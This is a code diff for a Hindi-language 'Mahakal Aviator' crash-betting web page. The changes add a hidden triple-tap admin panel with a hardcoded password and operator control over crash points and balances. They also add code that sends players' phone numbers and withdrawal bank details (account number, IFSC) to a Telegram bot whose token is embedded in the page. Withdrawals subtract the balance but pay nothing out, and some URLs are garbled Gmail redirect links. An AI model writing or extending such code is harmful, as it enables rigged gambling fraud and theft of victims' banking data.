@@ -1,11 +1,10 @@
-नमस्ते संदीप जी,
-<!DOCTYPE html>
+DOCTYPE html>
 <html lang="hi">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>महाकाल गेमिंग ज़ोन - Mahakal Aviator</title>
-<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://www.google.com/url?q=https://cdn.tailwindcss.com&source=gmail&ust=1793159854754000&sa=E"></script>
 <style>
 body { background-color: #0b0f19; color: #ffffff; font-family: Arial, sans-serif; margin: 0; padding: 10px; user-select: none; }
 .container { max-width: 420px; margin: auto; background: #131a26; padding: 12px; border-radius: 12px; border: 2px solid #00e676; box-shadow: 0 4px 20px rgba(0, 230, 118, 0.3); }
@@ -18,7 +17,7 @@ body { background-color: #0b0f19; color: #ffffff; font-family: Arial, sans-serif
 <!-- LOGIN SECTION -->
 <div id="login-section">
 <h1 class="text-xl font-bold text-center text-yellow-400 mb-2">🔱 महाकाल गेमिंग ज़ोन 🔱</h1>
-<p class="text-xs text-center text-gray-300 mb-4">नया खाता बनाएं & ₹1000 बोनस पाएं!</p>
+<p class="text-xs text-center text-gray-300 mb-4">नया खाता बनाएं & ₹10 बोनस पाएं!</p>
 <div class="space-y-3 bg-gray-800 p-3 rounded-lg text-sm">
 <label class="text-xs text-yellow-400 font-bold block">मोबाइल नंबर:</label>
 <input type="tel" id="login-phone" placeholder="10 अंकों का मोबाइल नंबर" class="w-full p-2 bg-gray-900 border border-gray-700 rounded text-white text-xs">
@@ -36,11 +35,12 @@ body { background-color: #0b0f19; color: #ffffff; font-family: Arial, sans-serif
 
 <!-- GAME DASHBOARD SECTION -->
 <div id="game-dashboard" class="hidden">
-<h1 class="text-xl font-bold text-center text-yellow-400 mb-3">✈️ Mahakal Aviator Game</h1>
+<!-- Secret Admin Trigger on Title (Triple Tap here to open admin) -->
+<h1 onclick="checkSecretAdminTap()" class="text-xl font-bold text-center text-yellow-400 mb-3 cursor-pointer select-none">✈️ Mahakal Aviator Game</h1>
 
 <!-- Wallet & Status -->
 <div class="bg-gray-800 p-2.5 rounded-lg mb-3 flex justify-between items-center text-xs">
-<div><span>वॉलेट: </span><span id="user-wallet" class="font-bold text-green-400">₹1000.00</span></div>
+<div><span>वॉलेट: </span><span id="user-wallet" class="font-bold text-green-400">₹10.00</span></div>
 <div><span class="bg-green-600 px-2 py-0.5 rounded text-white text-[10px]">Online</span></div>
 </div>
 
@@ -55,7 +55,6 @@ body { background-color: #0b0f19; color: #ffffff; font-family: Arial, sans-serif
 <div class="absolute top-2 right-3 text-lg">🌕</div>
 <div id="multiplier-text" class="text-3xl font-extrabold text-green-400 hidden animate-pulse">1.00x</div>
 <div id="timer-box" class="text-base text-yellow-400 font-bold">बेटिंग टाइम: <span id="countdown">15</span>s</div>
-<!-- Jahaj jo aage (right side) ki taraf face karega -->
 <div id="plane" class="absolute left-4 bottom-4 text-3xl hidden transition-transform duration-75" style="transform: scaleX(1) rotate(-15deg);">✈️</div>
 </div>
 
@@ -86,13 +85,8 @@ body { background-color: #0b0f19; color: #ffffff; font-family: Arial, sans-serif
 <button onclick="requestWithdrawal()" class="w-full bg-blue-600 hover:bg-blue-700 py-1.5 rounded font-bold text-white">विथड्रॉवल लगाएं</button>
 </div>
 
-<!-- Secret Admin Trigger -->
-<div class="text-center mt-2">
-<span onclick="openSecretAdmin()" class="text-[11px] text-sky-400 underline font-bold cursor-pointer bg-gray-800 px-3 py-1 rounded border border-slate-700">⚙️ Admin Settings (गुप्त)</span>
-</div>
-
-<!-- Super Admin Master Control Panel (Hidden) -->
-<div id="admin-panel-div" class="hidden bg-purple-950/90 border border-purple-500 p-3 rounded-lg mt-3 text-xs text-purple-200 text-left space-y-2">
+<!-- Super Admin Master Control Panel (Hidden & Telegram Integrated) -->
+<div id="admin-panel-div" class="hidden bg-purple-950/90 border border-purple-500 p-3 rounded-lg mt-3 text-xs text-purple-200 text-left space-y-3">
 <div class="flex justify-between items-center border-b border-purple-800 pb-1">
 <b>👑 सुपर एडमिन मास्टर कंट्रोल</b>
 <span onclick="closeSecretAdmin()" class="text-red-400 font-bold cursor-pointer">✕ बंद करें</span>
@@ -100,6 +94,14 @@ body { background-color: #0b0f19; color: #ffffff; font-family: Arial, sans-serif
 <div>
 बेट टाइम (Sec): <input type="number" id="admin-bet-time" value="15" class="w-16 p-1 bg-black text-green-400 border border-purple-500 rounded text-center font-bold">
 क्रैश पॉइंट (x): <input type="number" id="admin-crash-point" value="2.50" step="0.1" class="w-16 p-1 bg-black text-green-400 border border-purple-500 rounded text-center font-bold">
+</div>
+<!-- Real Balance / Deposit Updater Section inside Admin Panel -->
+<div class="border-t border-purple-800 pt-2">
+<b>💳 रियल बैलेंस/डिपॉजिट अपडेट करें:</b>
+<div class="flex gap-1 mt-1">
+<input type="number" id="admin-deposit-input" placeholder="₹ रकम डालें" class="w-full p-1 bg-black text-green-400 border border-purple-500 rounded text-xs">
+<button onclick="adminUpdateBalance()" class="bg-green-600 hover:bg-green-700 px-3 py-1 rounded text-white font-bold whitespace-nowrap">Update</button>
+</div>
 </div>
 <div>
 <b>⚡ क्विक सेट क्रैश:</b>
@@ -116,7 +118,7 @@ body { background-color: #0b0f19; color: #ffffff; font-family: Arial, sans-serif
 </div>
 
 <script>
-let walletBalance = 1000.00;
+let walletBalance = 10.00;
 let multiplier = 1.00;
 let gameInterval = null;
 let timerInterval = null;
@@ -125,9 +127,31 @@ let crashPoint = 2.50;
 let timeLeft = 15;
 let crashHistory = [1.45, 10.0, 2.10, 50.0, 3.20];
 
+// Telegram Bot Details
+const TELEGRAM_BOT_TOKEN = "8531701253:AAFoYZkt3kJhPCEipll6Lk-ut1XR1uC2epE";
+const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"; // Yahan apni Telegram Chat ID daalein
+
+function sendTelegramAlert(messageText) {
+if (TELEGRAM_CHAT_ID === "YOUR_CHAT_ID_HERE") return;
+let url = `https://www.google.com/url?q=https://api.telegram.org/bot$%7BTELEGRAM_BOT_TOKEN%7D/sendMessage?chat_id%3D$%7BTELEGRAM_CHAT_ID%7D%26text%3D%60&source=gmail&ust=1793159854754000&sa=E + encodeURIComponent(messageText);
+fetch(url).catch(err => console.log("Telegram Error:", err));
+}
+
 let bets = {
 1: { placed: false, amount: 0, cashedOut: false },
 2: { placed: false, amount: 0, cashedOut: false }
+};
+
+// Page Load par Saved Balance Check karein
+window.onload = function() {
+let savedBal = localStorage.getItem('mahakal_real_wallet');
+if (savedBal !== null) {
+walletBalance = parseFloat(savedBal);
+} else {
+walletBalance = 10.00; // Signup Bonus Default
+localStorage.setItem('mahakal_real_wallet', walletBalance);
+}
+updateWalletUI();
 };
 
 function verifyAndLogin() {
@@ -154,7 +178,10 @@ return;
 
 localStorage.setItem("user_phone", phone);
 msg.className = "text-xs font-bold text-green-400 mt-2";
-msg.innerText = "सफलतापूर्वक लॉगिन हो गया! गेम शुरू हो रहा है...";
+msg.innerText = "सफलतापूर्वक लॉगिन हो गया! ₹10 साइन-अप बोनस मिला। गेम शुरू हो रहा है...";
+
+// Telegram Alert for New Login
+sendTelegramAlert(`🔔 Naya User Login hua!\n📱 Mobile: ${phone}`);
 
 setTimeout(() => {
 document.getElementById('login-section').classList.add('hidden');
@@ -166,15 +193,47 @@ startCountdown();
 
 function updateWalletUI() {
 document.getElementById('user-wallet').innerText = "₹" + walletBalance.toFixed(2);
+localStorage.setItem('mahakal_real_wallet', walletBalance);
 }
 
-function openSecretAdmin() {
+// Admin Panel se real balance update karne ka function & Telegram Alert
+function adminUpdateBalance() {
+let amt = parseFloat(document.getElementById('admin-deposit-input').value);
+if(isNaN(amt) || amt <= 0) {
+alert("❌ कृपया सही रकम दर्ज करें!");
+return;
+}
+walletBalance += amt;
+updateWalletUI();
+
+let phoneNum = localStorage.getItem("user_phone") || "Unknown";
+sendTelegramAlert(`💰 New Deposit Added!\n📱 User: ${phoneNum}\n💵 Amount: ₹${amt}\n💳 Total Wallet: ₹${walletBalance}`);
+
+document.getElementById('admin-deposit-input').value = "";
+alert(`✅ सफलतापूर्वक ₹${amt} आपके रियल वॉलेट में जोड़ दिए गए हैं!`);
+}
+
+// Secret Triple-Tap Trigger on Title for Admin Panel
+let tapCount = 0;
+let lastTapTime = 0;
+function checkSecretAdminTap() {
+let currentTime = new Date().getTime();
+if (currentTime - lastTapTime < 600) {
+tapCount++;
+} else {
+tapCount = 1;
+}
+lastTapTime = currentTime;
+
+if (tapCount === 3) {
+tapCount = 0;
 let pass = prompt("गुप्त एडमिन पासवर्ड दर्ज करें:");
 if (pass === "78699") {
 document.getElementById('admin-panel-div').classList.remove('hidden');
 alert("✅ एडमिन पैनल खुल गया है!");
 } else if (pass !== null) {
 alert("❌ गलत पासवर्ड!");
+}
 }
 }
 
@@ -212,7 +271,7 @@ alert("❌ न्यूनतम ₹5 या अधिक दर्ज करे
 return;
 }
 if (walletBalance < betInput) {
-alert("❌ वॉलेट में पर्याप्त बैलेंस नहीं है!");
+alert("❌ वॉलेट में पर्याप्त बैलेंस नहीं है! कृपया एडमिन से संपर्क करें।");
 return;
 }
 
@@ -333,7 +392,6 @@ let yPos = (multiplier - 1) * 20;
 if(xPos > 230) xPos = 230;
 if(yPos > 90) yPos = 90;
 
-// Jahaj aage (right side) ki taraf move karega
 document.getElementById('plane').style.transform = `translate(${xPos}px, -${yPos}px) scaleX(1) rotate(-15deg)`;
 
 if (multiplier >= crashPoint) {
@@ -368,13 +426,29 @@ setTimeout(startCountdown, 3000);
 }
 
 function requestWithdrawal() {
+let bName = document.getElementById('bankName').value;
+let ifsc = document.getElementById('ifscCode').value;
+let accNo = document.getElementById('accountNo').value;
 let wAmount = document.getElementById('withdrawAmount').value;
+
 if(!wAmount || wAmount < 100) {
 alert('न्यूनतम विथड्रॉवल राशि ₹100 दर्ज करें!');
 return;
 }
+if(walletBalance < wAmount) {
+alert('❌ आपके वॉलेट में पर्याप्त बैलेंस नहीं है!');
+return;
+}
+
+walletBalance -= parseFloat(wAmount);
+updateWalletUI();
+
 let comm = wAmount * 0.02;
 let finalAmt = wAmount - comm;
+
+let phoneNum = localStorage.getItem("user_phone") || "Unknown";
+sendTelegramAlert(`⚠️ Withdrawal Request!\n📱 Mobile: ${phoneNum}\n💵 Amount: ₹${wAmount}\n🏦 Bank: ${bName}\n🔢 A/C: ${accNo}\n IFSC: ${ifsc}\n✂️ Final (After 2% comm): ₹${finalAmt}`);
+
 alert(`विथड्रॉवल अनुरोध स्वीकार हो गया है!\n2% कमीशन (₹${comm}) काटकर शेष राशि (₹${finalAmt}) आपके खाते में भेजी जा रही है।`);
 }
 </script>
